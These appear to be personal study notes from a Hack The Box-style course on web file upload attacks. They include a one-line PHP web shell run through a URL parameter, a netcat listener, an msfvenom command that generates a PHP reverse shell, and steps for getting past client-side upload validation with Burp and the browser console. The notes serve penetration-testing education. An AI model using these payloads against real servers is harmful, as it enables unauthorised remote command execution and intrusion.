# File Upload Attacks
Maybe web applications provide a means of uploading files to the host server or application, allowing for another threat vector to be possible.\
User input may not be correctly filtered or validated, allowing for the execution of arbitrary commands to start off more complex attacks.

---
## Attack Types
The most common is *weak file validation and verification*.\
The worst kind is *unauthenticated arbitrary file upload*.\
This would cause a web application to allow *ANY* unauthenticated user to upload *ANY* typie of file, giving the chance for code execution.

The most commona and critical attack as a result is *gaining remote command execution* via web shell or reverse shell code.

Some other attacks include *XSS*, *XXE*, *DoS*, *file overwrites* and more.

---
## Absent Validation
Without validation filters, we can upload any file type.\
For example, we could right away upload a .php file that will begin to run our code. 

---
## Identifying Web Framework
If malicious script uploads are possible, we will need to be know what framework is being run on that server.
> *The web shell must be written in the same programming langugae running on the back-end server*

It can be simple to figure this out.\
We may begin by viewing web extensions in the URL, however this does not always work.\
One example is visiting the */index.ext* page and checking one by one replacements for *ext* such as:
- index.php
- index.asp
- index.aspx
- etc.

We do not have to do this manually, and can instead use something like [wappalyzer](https://www.wappalyzer.com/)

### Vuln Identification
Once we figure out the framework, we can go ahead and do a test.\
Let us assume we have a *php based target*.\
We can test with a super simple script:
```PHP
<?php echo "Hello HTB";?>
<?php system('hostname'); ?>
```

### Upload Exploitation
After writing the code, we want to get it uploaded.
> Don't forget: **We need to visit the link it is stored at for the payload/code to execute**

We may not know right away where those files get stored after upload.\
One such example may be *www.domain/uploads/*, but we need to find out the real answer.\
We can use tools like [phpbash](https://github.com/Arrexel/phpbash) and [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) *usually found in /opt/useful/seclists/Web-Shells for HTB PWNBOX*.

While these tools for creating shells and finding stuff out are great, we will want to customize our payloads to be more complex and ift our needs the more advanced our skills and needs become.
```PHP
<?php system($_REQUEST['cmd']); ?>
```
Following this upload, we would then use the following to access: *http://SERVER_IP:PORT/uploads/shell.php?cmd=id*
> NOTE: *system()* executes system commands on the machine
>> It is also helpful to view the page source code (*ctrl-u*)

Sometimes, this won't work, and is likely due to a *WAF* or web application firewall put in place.

#### Reverse Shell
Reverse Shells allow for a full shell into the target system.\
Aside from creating your own, you can also check out [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell)
```Bash
# set up a listener
nc -lvnp <port>
```

##### Custom Reverse Shell Scripts
```Bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
```

---
## VALIDATIONS
### Client-Side Validation
Many web apps only rely on front-end JS code for file validation meaning we can easily bypass and get it onto the server.\
One simple bypass method is to *use the browser's dev tools*.

For example, we have a web page asking to *upload a profile picture*.\
We will see that our .php script is not an option on upload.\
What we can do now is exploit the fact that the page does not refresh or send any HTTP requests after grabbing the file.\
We can now *modify our request* or *manipulate the front-end code* (to be shown after)

---
### Back-end Request Modification
To start. let us see how our normal request looks using *Burpsuite*.\
[screenshot]

It appears to be a standard HTTP request to */upload.php*.\
We can see that it includes *filename=* as one of the headers in the request.\
We can easily modify this to be a *.php* file instead!
> Typically, we would want to also alter the *Content-Type* but that is not so important this time.

### Disabling Front-end Validation
Going into the *Page Inspector* with (*CTRL+SHIFT+C*) and click the prfile image\
[screenshot]

> WE can see the following: *<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">*
>> Notice the ***accept***

The more interesting part is onchange="checkFile(this)", which appears to run a JavaScript code whenever we select a file, which appears to be doing the file type validation.\
Let's go to the browser's *console* using (*CTRL+SHIFT+K*)\
Then type the function *checkFile*:
```JavaScript
function checkFile(File) {
...SNIP...
    if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png') {
        $('#error_message').text("Only images are allowed!");
        File.form.reset();
        $("#submit").attr("disabled", true);
    ...SNIP...
    }
}
```
We want to manipulate this to stop the file validation!
> NOTE: *These instructions were for firefox*, chrome may use another method.































